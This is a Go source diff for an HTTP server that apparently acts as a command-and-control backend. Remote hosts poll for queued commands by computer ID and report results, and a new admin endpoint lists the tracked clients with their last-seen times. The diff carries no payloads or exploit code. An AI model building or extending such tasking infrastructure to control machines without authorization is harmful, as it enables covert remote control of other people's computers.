@@ -16,12 +16,13 @@ import (
 )
 
 type Server struct {
-	port int
-	db   Db
+	port   int
+	cmdDb  CmdDb
+	hostDb HostDb
 }
 
 func NewServer(port int) Server {
-	w := Server{port, MakeDb()}
+	w := Server{port, MakeCmdDb(), MakeHostDb()}
 	rand.Seed(time.Now().Unix())
 	return w
 }
@@ -30,8 +31,9 @@ func (s *Server) Serve() {
 	srvaddr := "127.0.0.1:4444"
 	myRouter := mux.NewRouter().StrictSlash(true)
 
-	myRouter.HandleFunc("/admin/listCommands", s.adminListCommands)
-	myRouter.HandleFunc("/admin/addCommand", s.adminAddCommand)
+	myRouter.HandleFunc("/admin/commands", s.adminListCommands)
+	myRouter.HandleFunc("/admin/clients", s.adminListClients)
+	myRouter.HandleFunc("/admin/addTestCommand", s.adminAddTestCommand)
 
 	myRouter.HandleFunc("/getCommand/{computerId}", s.getCommand)
 	myRouter.HandleFunc("/sendCommand", s.sendCommand)
@@ -46,7 +48,7 @@ func (s *Server) Serve() {
 }
 
 func (s *Server) adminListCommands(rw http.ResponseWriter, r *http.Request) {
-	srvCmds := s.db.getAll()
+	srvCmds := s.cmdDb.getAll()
 	json, err := json.Marshal(srvCmds)
 	if err != nil {
 		log.Error("Could not JSON marshal")
@@ -55,17 +57,30 @@ func (s *Server) adminListCommands(rw http.ResponseWriter, r *http.Request) {
 	fmt.Fprint(rw, string(json))
 }
 
-func (s *Server) adminAddCommand(rw http.ResponseWriter, r *http.Request) {
+func (s *Server) adminListClients(rw http.ResponseWriter, r *http.Request) {
+	hostList := s.hostDb.getAsList()
+	json, err := json.Marshal(hostList)
+	if err != nil {
+		log.Error("Could not JSON marshal")
+		return
+	}
+	fmt.Fprint(rw, string(json))
+}
+
+func (s *Server) adminAddTestCommand(rw http.ResponseWriter, r *http.Request) {
 	c := model.NewCommandTest("0", strconv.Itoa(rand.Int()), []string{"arg0", "arg1"}, "")
 	srvCmd := NewSrvCmd(c, STATE_RECORDED, SOURCE_SRV)
-	s.db.add(srvCmd)
+	s.cmdDb.add(srvCmd)
 }
 
 func (s *Server) getCommand(rw http.ResponseWriter, r *http.Request) {
 	vars := mux.Vars(r)
 	computerId := vars["computerId"]
 
-	command, err := s.db.getCommandFor(computerId)
+	// Update last seen for this host
+	s.hostDb.updateFor(computerId)
+
+	command, err := s.cmdDb.getCommandFor(computerId)
 	if err != nil {
 		return
 	}
@@ -102,6 +117,7 @@ func (s *Server) sendCommand(rw http.ResponseWriter, r *http.Request) {
 		"command": command,
 	}).Info("Send command")
 
-	s.db.update(command)
+	s.cmdDb.update(command)
+	s.hostDb.updateFor(command.GetComputerId())
 	fmt.Fprint(rw, "asdf")
 }
